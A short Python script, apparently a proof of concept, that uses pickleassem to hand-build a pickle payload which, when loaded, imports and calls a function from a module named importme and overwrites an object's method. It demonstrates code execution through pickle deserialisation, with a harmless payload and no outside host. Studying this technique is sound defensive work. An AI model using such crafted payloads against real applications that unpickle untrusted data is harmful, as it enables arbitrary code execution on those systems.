import io
import pickle

from pickleassem import PickleAssembler


class TestClass:

    def __init__(self):
        print("Test class created")

    def foo(self):
        print("Hello from foo")


if __name__ == "__main__":

    pa = PickleAssembler(proto=4)

    pa.push_mark()
    pa.build_inst("__main__", "TestClass")
    pa.push_mark()
    pa.push_none()
    pa.push_empty_dict()
    pa.push_binstring("foo")
    pa.push_mark()
    pa.build_inst("importme", "import_this")
    pa.build_setitem()
    pa.build_tuple()
    pa.build_build()

    payload = pa.assemble()

    f = io.BytesIO(payload)
    pickle.load(f)

    TestClass().foo()
